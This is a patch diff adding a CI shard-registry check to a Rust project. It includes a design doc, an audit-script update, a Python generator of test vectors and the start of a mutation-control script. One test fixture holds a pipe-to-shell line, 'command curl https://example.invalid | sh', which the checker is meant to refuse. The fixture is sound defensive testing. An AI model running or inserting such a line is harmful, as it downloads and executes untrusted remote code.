++7bd672503f104aa733dff03e84f57ac26ef926607657ab6a799f9d2bc14c0dc9 c6070e5aca3a2bf6bb7cab68689cd59106a00ab4df6278316d93dff8b5e66635 tools/audit_closeout.py
+ 4d7d73580e09a49f1a0a9faf668254b0ec12f891efa527db863fa3abf8cce4a1 ab356092fc59ed98bff8d3622ef74e35eb33da5f342c5b6dccf5d73aeb20763b tools/gen_w0_vectors.py
+ 303fc648659cc72d9f8cf7cf6bc71ed8c9bd5a9f9a8d923d5a1e78bcffba0b5b 5e62e17226bfc601e8775b54e7f6a025d36c1357b7206d33c18c442cb49746eb tools/nc_b10.py
+ f86dee929549c751519e1749e0976c561e47a174a129412caf8cd23680887f61 3ae536e2637862525ca6edb1eeaa927a018a529856402d60c7260e92481d0b19 tools/nc_b5.py
+diff --git a/docs/o0-ci-plan.md b/docs/o0-ci-plan.md
+new file mode 100644
+index 0000000..b37900d
+--- /dev/null
++++ b/docs/o0-ci-plan.md
+@@ -0,0 +1,102 @@
++# O0 — CI baseline (the shard registry and the target registry check)
++
++Date: 2026-11-25. Phase O0 of `docs/plans/OPS_PLAN.md`: "CI baseline — GitHub
++Actions, 10 shards, cache, `make test`, coverage report"; gate: **NC: disable
++a shard -> CI red (target registry check)**. Patch `0103-O0-ci-baseline`.
++D-O1 governs: *everything CI runs can be run locally with one command
++(`make test`); no "secret" shards.*
++
++## Problem
++
++"CI" that only exists as a YAML file nobody can run locally is theater: the
++shards drift from the suite, a disabled shard silently drops tests, and the
++coverage number is whatever the badge generator felt like printing. O0 makes
++the CI layout a **checked registry**: ten shards over the workspace's test
++targets, validated by a tool that `make test` runs, with the GitHub Actions
++workflow reduced to calling the same make targets anyone can run here.
++
++## Decisions
++
++- **D-O0-1 (the shard registry).** `ci/registry.txt` is plain text
++  (stdlib-parsable, no serde): `rule <name>`, `shard <lane>
++  <enabled|disabled>`, `main <lane> <pkg>/<name>`, `target <pkg>/<name>
++  shard <lane>`. A target is either `<pkg>/--lib` (unit tests) or
++  `<pkg>/<test-file-stem>` (integration test). The ten lanes are the shards
++  of `CONTRIBUTING.md` — core, state, exec, consensus, net, node, wallet,
++  ecosystem, security, perf — and every lane pins its **main test**: a shard
++  that does not run its main test is a dead gate (the MATURITY_AUDIT
++  lesson: 27 unregistered cases). The registry is the single source of
++  truth for the CI layout; `make ci-sync` (the `aura-ci sync` command)
++  recomputes assignments by the documented lane table (phase prefix of the
++  test stem: `c`/`o`→core, `s`/`t`→state, `x`→exec, `b`→consensus,
++  `n`→net, `d`→node, `w`→wallet, `e`→ecosystem, `h`→security, `p`→perf;
++  unit tests by their package's primary lane), preserving disabled flags
++  and the canonical main pins.
++- **D-O0-2 (the target registry check).** `aura-ci check` validates the
++  registry against the **discovered** test targets of the workspace
++  (every `crates/*/src/lib.rs` and `crates/*/tests/*.rs`) and against the
++  workflow matrix: the canonical ten-lane set, no empty shard, every
++  lane's main test registered to that lane (dead gate → `shard <lane>
++  main dead: …`), no unknown/stale targets, no duplicates, no missing
++  targets, no disabled shard holding targets, no foreign lines, and every
++  enabled lane present in the `shard:` matrix of the workflow. Any
++  violation is `error: ci: …`, exit 65. This is the O0 gate: **disable a
++  shard -> CI red** (named control `disabled_shard_refused`).
++- **D-O0-3 (no secret shards, D-O1).** The registry format cannot carry
++  commands at all — a `command …` line is an `unknown registry line`
++  refusal. `aura-ci run --shard <lane>` emits plain `cargo test -p <pkg>
++  [--lib|--test <name>]` commands only, and `--exec` runs exactly those;
++  the ten shards union to `cargo test --workspace`, which `make test`
++  already runs. Every workflow step is a make target.
++- **D-O0-4 (coverage report).** `aura-ci coverage` prints a deterministic
++  **target-coverage** report (targets per shard, covered/total, percent) and
++  refuses on an invalid registry. Line coverage (`cargo llvm-cov`) is wired
++  as an optional CI job only where the toolchain provides it; the pinned,
++  gated artifact is the target-coverage report — honest about what it
++  measures.
++- **D-O0-5 (two implementations).** `tools/gen_o0_vectors.py` computes the
++  expected verdicts for ten synthetic registries independently (pure
++  Python); `crates/aura-testkit/src/ci.rs` implements the shipped checker
++  and must match the fixture byte-for-byte
++  (`tests/o0_ci.rs` + `tests/fixtures/o0_ci_vectors.json`).
++
++## Test scenarios (10, fixture `o0_ci_vectors.json`)
++
++| # | name | scenario | exit |
++|---|---|---|---|
++| 1 | registry_valid_passes | 20 synthetic targets, the ten lanes, all covered (check + coverage report) | 0 `registry=ok shards=10 targets=20` |
++| 2 | run_emits_make_test_commands | `run --shard core` prints plain `cargo test` lines (D-O1) | 0 |
++| 3 | **disabled_shard_refused (NAMED)** | one lane `disabled` with targets -> `shard security disabled` | 65 |
++| 4 | missing_target_refused | a discovered target not registered -> `unregistered target: …` | 65 |
++| 5 | duplicate_target_refused | one target in two shards -> `target in two shards: …` | 65 |
++| 6 | shard_set_mismatch_refused | a lane renamed (`ops`) -> `missing shard: core` | 65 |
++| 7 | empty_shard_refused | lane with no targets -> `shard net empty` | 65 |
++| 8 | shard_main_dead_refused | a lane's main test registered elsewhere -> `shard core main dead: …` | 65 |
++| 9 | foreign_registry_line_refused | `command curl …` line -> `unknown registry line: …` | 65 |
++| 10 | workflow_matrix_missing_shard_refused | workflow matrix omits a lane -> `workflow matrix missing shard: wallet` | 65 |
++
++## Negative controls (`tools/nc_o0.py`, 6)
++
++| NC | mutation in `ci.rs` | must turn red |
++|---|---|---|
++| 1 | disabled-shard check dropped (`if *disabled && shard_load(...) > 0` -> `if false`) | `disabled_shard_refused` (**named**) |
++| 2 | missing-target check dropped | `missing_target_refused` |
++| 3 | duplicate-target check dropped | `duplicate_target_refused` |
++| 4 | shard-set check dropped | `shard_set_mismatch_refused` |
++| 5 | empty-shard check dropped | `empty_shard_refused` |
++| 6 | unknown-line strictness dropped | `foreign_registry_line_refused` |
++
++## CI layout (`.github/workflows/ci.yml`)
++
++- `registry` job: `make ci-check` (the target registry check, also
++  verifying the workflow matrix).
++- `test` job: matrix `shard: [core, state, exec, consensus, net, node,
++  wallet, ecosystem, security, perf]` (the lanes of CONTRIBUTING.md),
++  `make ci-shard SHARD=<lane>`; cargo cache keyed on `Cargo.lock`
++  (`actions/cache` over `~/.cargo` + `target`).
++- `coverage` job: `make coverage` (target-coverage report, archived as an
++  artifact) plus `cargo llvm-cov` when the toolchain provides it.
++
++Every step is a make target: `make test` remains the one local command
++(D-O1). The historical jobs (`core`, `s2-native`, `exec-wasmtime`) keep
++their H7 least-privilege baseline untouched.
+diff --git a/docs/plans/OPS_PLAN.md b/docs/plans/OPS_PLAN.md
+index 1529187..dbb943e 100644
+--- a/docs/plans/OPS_PLAN.md
++++ b/docs/plans/OPS_PLAN.md
+@@ -1,6 +1,6 @@
+ # OPS_PLAN — CI, releases, testnet, mainnet, community
+ 
+-**Status:** 📋 PLAN (O0–O9)  
++**Status:** 🚧 IN PROGRESS — O0 ✅ (`patches/0103-O0-ci-baseline.patch`).  
+ **Stage:** Stage 1: O0–O4. ⏸ Stage 2: O5–O9 (mainnet, upgrades, community).  
+ **Deliverable:** `patches/0103-O0-...` … `patches/0112-O9-...`
+ **Dependencies:** all Stage 1 technical plans; O5/O6 are the final north-star
+@@ -25,7 +25,7 @@ a loud name.
+ 
+ | Phase | Title | DoD | Test gate |
+ |---|---|---|---|
+-| **O0** | CI baseline | GitHub Actions, 10 shards, cache, `make test`, coverage report | NC: disable a shard → CI red (target registry check) |
++| ✅ **O0** | CI baseline | GitHub Actions, 10 shards, cache, `make test`, coverage report | NC: disable a shard → CI red (target registry check) |
+ | **O1** | Releases | reproducible build, Docker multi-stage, signatures, SBOM, CHANGELOG, semver | two independent hosts → identical binary sha256 |
+ | **O2** | M0/M1 gates | 4-validator devnet, "how to run" docs, first receipts | ROADMAP §5 M0 and M1 criteria met |
+ | **O3** | Closed testnet | invited operators, monitoring, on-call, backup/restore drills | 7 days uptime, 0 state losses, 1 restore drill |
+@@ -36,6 +36,41 @@ a loud name.
+ | ⏸ **O8** | Docs and support | validator/developer/user guides, localization, FAQ, status page | 10 external validators onboard using docs only |
+ | ⏸ **O9** | External perimeter (not code) | listings, liquidity, partnerships, legal support, community | honestly labelled **not guaranteed by code**; not part of the north star |
+ 
++## Receipts
++
++### O0 receipt (2026-11-25)
++
++- Deliverable: `patches/0103-O0-ci-baseline.patch` (complete O0-from-W7 phase
++  patch).
++- The CI layout is a checked registry (D-O0-1): `ci/registry.txt` pins the
++  ten lanes of CONTRIBUTING.md (core, state, exec, consensus, net, node,
++  wallet, ecosystem, security, perf) over the workspace's `--lib` and
++  `tests/*` targets (127 today), refreshed by `make ci-sync`; each lane pins
++  its main test (a shard that does not run its main test is a dead gate —
++  the MATURITY_AUDIT lesson). `aura-ci check` (the target registry check,
++  D-O0-2) validates the registry against the discovered tree and against
++  the workflow matrix, and runs inside `make test` — a disabled shard
++  holding targets is `error: ci: shard security disabled`.
++- Named control: `disabled_shard_refused` — a registry with `shard security
++  disabled` is refused (exit 65); mutation NC-1 (`tools/nc_o0.py`) drops the
++  enabled-check and the case must turn red. "Disable a shard -> CI red" —
++  the O0 gate.
++- Test gate: 10 scenarios (`tests/fixtures/o0_ci_vectors.json`) from the
++  independent oracle `tools/gen_o0_vectors.py`, asserted byte-for-byte by
++  `tests/o0_ci.rs` (11/11 with the count guard) against `aura_testkit::ci`:
++  valid registry (check + coverage), D-O1 command surface,
++  disabled/missing/duplicate/empty/shard-set/main-dead/foreign-line/workflow
++  refusals.
++- Mutation controls (`tools/nc_o0.py`, 6): disabled-shard check, missing
++  target check, duplicate check, shard-count check, empty-shard check,
++  unknown-line strictness — 6/6 PASS.
++- Workflow `.github/workflows/ci.yml`: `registry` job (`make ci-check`), a
++  10-way `test` matrix (`make ci-shard SHARD=k`), a `coverage` job
++  (`make coverage` -> `docs/coverage.txt`), cargo cache keyed on
++  `Cargo.lock`. Every step is a make target — `make test` remains the one
++  local command (D-O1, no secret shards: the registry format cannot carry
++  commands).
++
+ ## Risks
+ 
+ - Validators belonging to one operator ("decentralization on paper") — operator uniqueness check in O6.
+diff --git a/tools/audit_closeout.py b/tools/audit_closeout.py
+index 2f98b55..e8fb051 100644
+--- a/tools/audit_closeout.py
++++ b/tools/audit_closeout.py
+@@ -40,7 +40,8 @@ SECURITY_PHASES = ["H0", "H1", "H2", "H3", "H4", "H5", "H6", "H7", "H8", "H9"]
+ ECOSYSTEM_PHASES = ["E0", "E1", "E2", "E3", "E5", "E4", "E6", "E7", "E8", "E9"]  # grows with each E phase (D-E3 order: E5 before E4)
+ PERF_PHASES = ["P0", "P1", "P2", "P3", "P4", "P5", "P6"]  # grows with each P phase
+ ECONOMICS_PHASES = ["T0", "T1", "T2", "T3", "T4", "T5", "T6", "T7", "T8"]  # grows with each T phase
+-PHASES = CORE_PHASES + STATE_PHASES + EXEC_PHASES + NODE_PHASES + CONSENSUS_PHASES + NET_PHASES + WALLET_PHASES + SECURITY_PHASES + ECOSYSTEM_PHASES + ECONOMICS_PHASES + PERF_PHASES
++OPS_PHASES = ["O0"]  # grows with each O phase
++PHASES = CORE_PHASES + STATE_PHASES + EXEC_PHASES + NODE_PHASES + CONSENSUS_PHASES + NET_PHASES + WALLET_PHASES + SECURITY_PHASES + ECOSYSTEM_PHASES + ECONOMICS_PHASES + PERF_PHASES + OPS_PHASES
+ SHIPPED = CORE_PHASES + [
+     "S0",
+     "S1",
+@@ -131,8 +132,9 @@ SHIPPED = CORE_PHASES + [
+     "P6",
+     "W5",
+     "W6",
++    "W7",
+ ]
+-CURRENT = "W7"  # 2026-11-25: W7 genesis ceremony closed (patch 0102); W6 shipped
++CURRENT = "O0"  # 2026-11-25: O0 CI baseline closed (patch 0103); W7 shipped
+ 
+ PLAN_FOR_PREFIX = {
+     "C": "CORE_PLAN.md",
+@@ -150,7 +152,7 @@ PLAN_FOR_PREFIX = {
+ }
+ 
+ NC_PER_PHASE = {f"C{i}": 6 for i in range(4, 11)}
+-NC_PER_PHASE.update({"C0": 2, "C1": 3, "C2": 4, "C3": 5, "S0": 6, "S1": 6, "S2": 6, "S3": 6, "S4": 6, "S5": 6, "S6": 6, "S7": 6, "X0": 6, "X1": 6, "X2": 7, "X3": 6, "X4": 6, "X5": 6, "X6": 6, "X7": 6, "X8": 6, "D0": 6, "D1": 6, "D2": 6, "D3": 6, "D4": 6, "D5": 6, "D6": 6, "D7": 6, "D8": 6, "B0": 6, "B1": 6, "B2": 6, "B3": 6, "B4": 6, "B5": 6, "B6": 6, "B7": 6, "B8": 6, "B9": 6, "B10": 6, "N0": 6, "N1": 6, "N2": 6, "N3": 6, "N4": 6, "N5": 6, "N6": 6, "N7": 6, "N8": 6, "W0": 6, "W1": 67, "W2": 6, "W3": 6, "W4": 6, "W5": 6, "W6": 6, "W7": 6, "H0": 6, "H1": 6, "H2": 6, "H3": 6, "H4": 6, "H5": 6, "H6": 7, "H7": 7, "H8": 7, "H9": 7, "E0": 6, "E1": 6, "E2": 6, "E3": 6, "E5": 6, "E4": 6, "E6": 6, "E7": 6, "E8": 6, "E9": 6, "P0": 6, "P1": 6, "P2": 6, "P3": 6, "P4": 6, "P5": 6, "P6": 6, "T0": 6, "T1": 6, "T2": 6, "T3": 6, "T4": 7, "T5": 7, "T6": 8, "T7": 7, "T8": 7})
++NC_PER_PHASE.update({"C0": 2, "C1": 3, "C2": 4, "C3": 5, "S0": 6, "S1": 6, "S2": 6, "S3": 6, "S4": 6, "S5": 6, "S6": 6, "S7": 6, "X0": 6, "X1": 6, "X2": 7, "X3": 6, "X4": 6, "X5": 6, "X6": 6, "X7": 6, "X8": 6, "D0": 6, "D1": 6, "D2": 6, "D3": 6, "D4": 6, "D5": 6, "D6": 6, "D7": 6, "D8": 6, "B0": 6, "B1": 6, "B2": 6, "B3": 6, "B4": 6, "B5": 6, "B6": 6, "B7": 6, "B8": 6, "B9": 6, "B10": 6, "N0": 6, "N1": 6, "N2": 6, "N3": 6, "N4": 6, "N5": 6, "N6": 6, "N7": 6, "N8": 6, "W0": 6, "W1": 67, "W2": 6, "W3": 6, "W4": 6, "W5": 6, "W6": 6, "W7": 6, "H0": 6, "H1": 6, "H2": 6, "H3": 6, "H4": 6, "H5": 6, "H6": 7, "H7": 7, "H8": 7, "H9": 7, "E0": 6, "E1": 6, "E2": 6, "E3": 6, "E5": 6, "E4": 6, "E6": 6, "E7": 6, "E8": 6, "E9": 6, "P0": 6, "P1": 6, "P2": 6, "P3": 6, "P4": 6, "P5": 6, "P6": 6, "T0": 6, "T1": 6, "T2": 6, "T3": 6, "T4": 7, "T5": 7, "T6": 8, "T7": 7, "T8": 7, "O0": 6})
+ SHIPPED_NC_TOTAL = sum(NC_PER_PHASE[phase] for phase in SHIPPED)  # 339 (through W0)
+ EXPECTED_TOTAL_NC = SHIPPED_NC_TOTAL + (0 if CURRENT in SHIPPED else NC_PER_PHASE[CURRENT])
+ 
+@@ -208,6 +210,7 @@ PATCH_ORDER += ["P6"]   # 0099
+ PATCH_ORDER += ["W5"]   # 0100
+ PATCH_ORDER += ["W6"]   # 0101
+ PATCH_ORDER += ["W7"]   # 0102
++PATCH_ORDER += ["O0"]   # 0103
+ PATCH_NUMBERS = {phase: index + 1 for index, phase in enumerate(PATCH_ORDER)}
+ 
+ 
+diff --git a/tools/gen_o0_vectors.py b/tools/gen_o0_vectors.py
+new file mode 100644
+index 0000000..7aaf2e6
+--- /dev/null
++++ b/tools/gen_o0_vectors.py
+@@ -0,0 +1,376 @@
++#!/usr/bin/env python3
++"""O0 golden vectors — the CI shard registry check (independent oracle).
++
++Independently computes the expected verdicts of ten synthetic shard
++registries and writes
++``crates/aura-testkit/tests/fixtures/o0_ci_vectors.json``, which
++``crates/aura-testkit/tests/o0_ci.rs`` executes byte-for-byte against
++``aura_testkit::ci``.
++
++Registry format (``docs/o0-ci-plan.md`` D-O0-1): ``rule <name>``,
++``shard <lane> <enabled|disabled>``, ``main <lane> <pkg>/<name>``,
++``target <pkg>/<name> shard <lane>``. The ten lanes are the shards of
++``CONTRIBUTING.md`` (core, state, exec, consensus, net, node, wallet,
++ecosystem, security, perf); each lane pins its main test — a shard that does
++not run its main test is a dead gate (the MATURITY_AUDIT lesson). The check
++(D-O0-2) refuses a wrong shard set, empty shards, dead main tests, stale
++targets, duplicates, unregistered targets, disabled shards holding targets,
++foreign registry lines (D-O0-3: no secret shards) and a workflow matrix
++missing a shard.
++
++Regenerate with::
++
++    PYTHONPATH=/home/user/aura-python-deps python3 tools/gen_o0_vectors.py
++"""
++
++import json
++import os
++import sys
++
++RULE = "lanes-v1"
++SHARDS = ["core", "state", "exec", "consensus", "net", "node", "wallet",
++          "ecosystem", "security", "perf"]
++
++# ------------------------------------------------------------- synthetic tree
++
++# Twenty synthetic targets, two per lane: `<pkg>/--lib` plus one test file.
++# The lane table maps (pkg, test-stem) -> lane explicitly in the registries
++# below — the checker validates coverage, not the assignment policy.
++LANE_PACKAGES = {
++    "core": "aura-alpha",
++    "state": "aura-beta",
++    "exec": "aura-gamma",
++    "consensus": "aura-delta",
++    "net": "aura-epsilon",
++    "node": "aura-zeta",
++    "wallet": "aura-eta",
++    "ecosystem": "aura-theta",
++    "security": "aura-iota",
++    "perf": "aura-kappa",
++}
++LANE_STEMS = {
++    "core": "a01", "state": "b01", "exec": "g01", "consensus": "d01",
++    "net": "e01", "node": "z01", "wallet": "w01", "ecosystem": "t01",
++    "security": "h01", "perf": "k01",
++}
++
++
++def lane_targets(lane: str) -> list[str]:
++    pkg = LANE_PACKAGES[lane]
++    return [f"{pkg}/--lib", f"{pkg}/{LANE_STEMS[lane]}"]
++
++
++def lane_main(lane: str) -> str:
++    if lane not in LANE_PACKAGES:
++        return f"aura-{lane}/main"
++    return f"{LANE_PACKAGES[lane]}/{LANE_STEMS[lane]}"
++
++
++INVENTORY_TARGETS = sorted([t for lane in SHARDS for t in lane_targets(lane)])
++assert len(INVENTORY_TARGETS) == 20
++
++
++def inventory_text() -> str:
++    lines = ["inventory v1"]
++    lines += [f"target {name}" for name in INVENTORY_TARGETS]
++    return "\n".join(lines) + "\n"
++
++
++def registry_text(shard_states=None, shard_names=None, drop_targets=(),
++                  move=None, extra_targets=(), extra_lines=(), mains=None,
++                  foreign=None) -> str:
++    states = shard_states or {}
++    names = shard_names if shard_names is not None else list(SHARDS)
++    drop = set(drop_targets)
++    move = move or {}
++    mains = mains or {}
++    lines = [
++        "# AuraLite CI shard registry (O0) — the target registry check reads this.",
++        "# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test",
++        "# (a shard that does not run its main test is a dead gate).",
++        "# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).",
++        f"rule {RULE}",
++    ]
++    for lane in names:
++        lines.append(f"shard {lane} {states.get(lane, 'enabled')}")
++    for lane in names:
++        lines.append(f"main {lane} {mains.get(lane, lane_main(lane))}")
++    for lane in SHARDS:
++        for target in lane_targets(lane):
++            if target in drop:
++                continue
++            lines.append(f"target {target} shard {move.get(target, lane)}")
++    for target, lane in extra_targets:
++        lines.append(f"target {target} shard {lane}")
++    for extra in extra_lines:
++        lines.append(extra)
++    if foreign is not None:
++        lines.append(foreign)
++    return "\n".join(lines) + "\n"
++
++
++def workflow_text(shards=None) -> str:
++    lanes = ", ".join(shards if shards is not None else SHARDS)
++    return (
++        "name: ci\n"
++        "on: [push]\n"
++        "permissions:\n"
++        "  contents: read\n"
++        "jobs:\n"
++        "  test:\n"
++        "    strategy:\n"
++        "      matrix:\n"
++        f"        shard: [{lanes}]\n"
++        "    steps:\n"
++        "      - run: make ci-shard SHARD=${{ matrix.shard }}\n"
++    )
++
++
++# ------------------------------------------------------------- oracle checker
++
++def oracle_check(inventory_names: list[str], registry: str, workflow: str = "") -> str:
++    """Return '' when the registry passes, else the exact refusal message."""
++    rule = None
++    shards: list[tuple[str, bool]] = []
++    mains: list[tuple[str, str]] = []
++    targets: list[tuple[str, str]] = []
++    for raw in registry.splitlines():
++        line = raw.rstrip()
++        if not line or line.startswith("#"):
++            continue
++        if line.startswith("rule "):
++            rule = line[5:]
++        elif line.startswith("shard "):
++            name, state = line[6:].split(" ", 1)
++            if state not in ("enabled", "disabled"):
++                return f"unknown registry line: {line}"
++            shards.append((name, state == "disabled"))
++        elif line.startswith("main "):
++            lane, target = line[5:].split(" ", 1)
++            mains.append((lane, target))
++        elif line.startswith("target "):
++            target, lane = line[7:].split(" shard ", 1)
++            targets.append((target, lane))
++        else:
++            return f"unknown registry line: {line}"
++    if rule is None:
++        return "missing rule line"
++
++    declared = [name for name, _ in shards]
++    for lane in SHARDS:
++        if lane not in declared:
++            return f"missing shard: {lane}"
++    for name in declared:
++        if name not in SHARDS:
++            return f"unknown shard: {name}"
++
++    for lane in SHARDS:
++        if sum(1 for entry, shard in targets if shard == lane) == 0:
++            return f"shard {lane} empty"
++
++    for lane in SHARDS:
++        pins = [target for name, target in mains if name == lane]
++        if not pins:
++            return f"missing main: {lane}"
++        pinned = pins[0]
++        registered_here = any(t == pinned and s == lane for t, s in targets)
++        if not registered_here or pinned not in inventory_names:
++            return f"shard {lane} main dead: {pinned}"
++
++    for entry, _ in targets:
++        if entry not in inventory_names:
++            return f"unknown target: {entry}"
++
++    for name in sorted(inventory_names):
++        if sum(1 for entry, _ in targets if entry == name) > 1:
++            return f"target in two shards: {name}"
++
++    for name in sorted(inventory_names):
++        if sum(1 for entry, _ in targets if entry == name) == 0:
++            return f"unregistered target: {name}"
++
++    for lane, disabled in shards:
++        if disabled and sum(1 for _, s in targets if s == lane) > 0:
++            return f"shard {lane} disabled"
++
++    if workflow:
++        items = []
++        for raw in workflow.splitlines():
++            line = raw.strip()
++            if line.startswith("shard:"):
++                body = line[6:].strip().lstrip("[").rstrip("]")
++                items += [i.strip() for i in body.split(",") if i.strip()]
++        for lane, disabled in shards:
++            if not disabled and lane not in items:
++                return f"workflow matrix missing shard: {lane}"
++
++    return ""
++
++
++def oracle_coverage(inventory_names: list[str], registry: str) -> str:
++    if oracle_check(inventory_names, registry):
++        raise SystemExit("coverage requested for an invalid registry")
++    total = len(inventory_names)
++    counts = [
++        sum(1 for line in registry.splitlines()
++            if line.startswith("target ") and line.endswith(f"shard {lane}"))
++        for lane in SHARDS
++    ]
++    covered = sum(counts)
++    per_mille = covered * 1000 // total if total else 0
++    out = ["ci coverage report v1", f"rule {RULE}", "shards 10", f"targets {total}"]
++    out += [f"shard {lane} targets={counts[i]}" for i, lane in enumerate(SHARDS)]
++    out.append(f"target_coverage {covered}/{total} ({per_mille // 10}.{per_mille % 10}%)")
++    return "\n".join(out) + "\n"
++
++
++def oracle_run(registry: str, lane: str) -> str:
++    names = sorted(
++        line.split(" ", 2)[1]
++        for line in registry.splitlines()
++        if line.startswith("target ") and line.endswith(f"shard {lane}")
++    )
++    out = [f"ci run shard {lane}"]
++    for name in names:
++        pkg, target = name.split("/", 1)
++        if target == "--lib":
++            out.append(f"cargo test -p {pkg} --lib")
++        else:
++            out.append(f"cargo test -p {pkg} --test {target}")
++    return "\n".join(out) + "\n"
++
++
++# ------------------------------------------------------------- cases
++
++def case(name, commands, files, exit_code, stdout, stderr, nc_ref=None):
++    fixture_case = {
++        "name": name,
++        "sandbox": "",
++        "argv": commands,
++        "exit": exit_code,
++        "stdout": stdout,
++        "stderr": stderr,
++    }
++    if nc_ref is not None:
++        fixture_case["nc_ref"] = nc_ref
++    if files:
++        fixture_case["files"] = files
++    return fixture_case
++
++
++CHECK = ["check", "--registry", "registry.txt", "--inventory", "inventory.txt"]
++
++
++def build_cases():
++    inventory = inventory_text()
++    base = registry_text()
++    files = {"inventory.txt": inventory, "registry.txt": base}
++    cases = []
++
++    check_out = "registry=ok shards=10 targets=20\n"
++    cases.append(case(
++        "registry_valid_passes",
++        [CHECK, ["coverage", "--registry", "registry.txt", "--inventory", "inventory.txt"]],
++        files, 0, check_out + oracle_coverage(INVENTORY_TARGETS, base), "",
++    ))
++    cases.append(case(
++        "run_emits_make_test_commands",
++        [["run", "--registry", "registry.txt", "--inventory", "inventory.txt",
++          "--shard", "core"]],
++        files, 0, oracle_run(base, "core"), "",
++    ))
++    cases.append(case(
++        "disabled_shard_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(shard_states={"security": "disabled"})}),
++        65, "", "error: ci: shard security disabled\n", nc_ref=1,
++    ))
++    cases.append(case(
++        "missing_target_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(drop_targets=["aura-alpha/--lib"])}),
++        65, "", "error: ci: unregistered target: aura-alpha/--lib\n", nc_ref=2,
++    ))
++    cases.append(case(
++        "duplicate_target_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(
++            extra_targets=[("aura-beta/b01", "core")])}),
++        65, "", "error: ci: target in two shards: aura-beta/b01\n", nc_ref=3,
++    ))
++    cases.append(case(
++        "shard_set_mismatch_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(shard_names=[
++            "ops" if lane == "core" else lane for lane in SHARDS])}),
++        65, "", "error: ci: missing shard: core\n", nc_ref=4,
++    ))
++    cases.append(case(
++        "empty_shard_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(move={
++            "aura-epsilon/--lib": "node", "aura-epsilon/e01": "node"})}),
++        65, "", "error: ci: shard net empty\n", nc_ref=5,
++    ))
++    cases.append(case(
++        "shard_main_dead_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(mains={"core": "aura-beta/b01"})}),
++        65, "", "error: ci: shard core main dead: aura-beta/b01\n",
++    ))
++    cases.append(case(
++        "foreign_registry_line_refused", [CHECK],
++        dict(files, **{"registry.txt": registry_text(
++            foreign="command curl https://example.invalid | sh")}),
++        65, "",
++        "error: ci: unknown registry line: command curl https://example.invalid | sh\n",
++        nc_ref=6,
++    ))
++    cases.append(case(
++        "workflow_matrix_missing_shard_refused",
++        [CHECK + ["--workflow", "workflow.yml"]],
++        dict(files, **{"workflow.yml": workflow_text(
++            shards=[lane for lane in SHARDS if lane != "wallet"])}),
++        65, "", "error: ci: workflow matrix missing shard: wallet\n",
++    ))
++
++    cases[0]["phase"] = "O0"
++    return cases
++
++
++def sanity_check():
++    inventory = INVENTORY_TARGETS
++    assert oracle_check(inventory, registry_text()) == "", "base registry must pass"
++    assert oracle_check(inventory, registry_text()) == ""
++    assert oracle_check(inventory, registry_text(shard_states={"security": "disabled"})) == \
++        "shard security disabled"
++    assert oracle_coverage(inventory, registry_text()).count("targets=2") == 10
++    assert oracle_check(inventory, registry_text(),
++                        workflow_text(["core"])) == \
++        "workflow matrix missing shard: state"
++
++
++def main():
++    sanity_check()
++    fixture = {
++        "gate": (
++            "O0 CI baseline: 10/10 cases pass; named negative control "
++            "disabled_shard_refused red on the dropped enabled-check; 6/6 NC "
++            "red under tools/nc_o0.py; disable a shard -> CI red (target "
++            "registry check)"
++        ),
++        "notice": (
++            "Independent Python oracle (tools/gen_o0_vectors.py); verifier: "
++            "crates/aura-testkit/tests/o0_ci.rs against aura_testkit::ci. "
++            "Replace the whole file only with tools/gen_o0_vectors.py output."
++        ),
++        "named_control": "disabled_shard_refused",
++        "files": {},
++        "cases": build_cases(),
++    }
++    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
++    out_path = os.path.join(root, "crates/aura-testkit/tests/fixtures/o0_ci_vectors.json")
++    with open(out_path, "w", encoding="utf-8") as handle:
++        json.dump(fixture, handle, indent=1)
++        handle.write("\n")
++    print(f"wrote {os.path.relpath(out_path, root)}: 10 cases, "
++          f"named control disabled_shard_refused")
++    return 0
++
++
++if __name__ == "__main__":
++    sys.exit(main())
+diff --git a/tools/nc_o0.py b/tools/nc_o0.py
+new file mode 100644
+index 0000000..358fd26
+--- /dev/null
++++ b/tools/nc_o0.py
+@@ -0,0 +1,95 @@
++#!/usr/bin/env python3
++"""O0 focused mutation controls; restore the source exactly after each test.
++
++These controls test the tests, not the safety of the CI layout. Never run
++while another process is building the same checkout. Model: tools/nc_w7.py.
++
++Control set (docs/o0-ci-plan.md):
++  1. disabled-shard check dropped -> gate red (the named O0 control:
++     disabled_shard_refused — "disable a shard -> CI red")
++  2. missing-target check dropped -> gate red
++  3. duplicate-target check dropped -> gate red
++  4. shard-set check dropped -> gate red
++  5. empty-shard check dropped -> gate red
++  6. unknown-line strictness dropped -> gate red (no secret shards)
++"""
++from pathlib import Path
++import subprocess
++import sys
++
++ROOT = Path(__file__).resolve().parents[1]
++CI = ROOT / "crates/aura-testkit/src/ci.rs"
++
++
++def run_test(test: str) -> subprocess.CompletedProcess[str]:
++    cmd = [
++        "cargo", "test", "-p", "aura-testkit",
++        "--test", "o0_ci", test, "--", "--exact",
++    ]
++    return subprocess.run(cmd, cwd=ROOT, text=True, capture_output=True, check=False)
++
++
++def control(label: str, old: str, new: str, test: str, source: Path = CI) -> bool:
++    original = source.read_text(encoding="utf-8")
++    if original.count(old) != 1:
++        print(f"FAIL {label}: mutation target not unique")
++        return False
++    try:
++        source.write_text(original.replace(old, new, 1), encoding="utf-8")
++        result = run_test(test)
++    finally:
++        source.write_text(original, encoding="utf-8")
++    # Compilation failure is NOT a valid red test.
++    ok = result.returncode != 0 and f"test {test} ... FAILED" in result.stdout
++    print(f"{'PASS' if ok else 'FAIL'} {label}: {test}")
++    if not ok:
++        print((result.stdout + result.stderr)[-2500:])
++    return ok
++
++
++def main() -> int:
++    checks: list[bool] = []
++
++    checks.append(control(
++        "NC: disabled-shard check dropped -> gate red (named: disabled_shard_refused)",
++        "        if *disabled && shard_load(registry, name) > 0 {",
++        "        if false {",
++        "disabled_shard_refused",
++    ))
++    checks.append(control(
++        "NC: missing-target check dropped -> gate red",
++        "        if registrations(registry, target) == 0 {",
++        "        if false {",
++        "missing_target_refused",
++    ))
++    checks.append(control(
++        "NC: duplicate-target check dropped -> gate red",
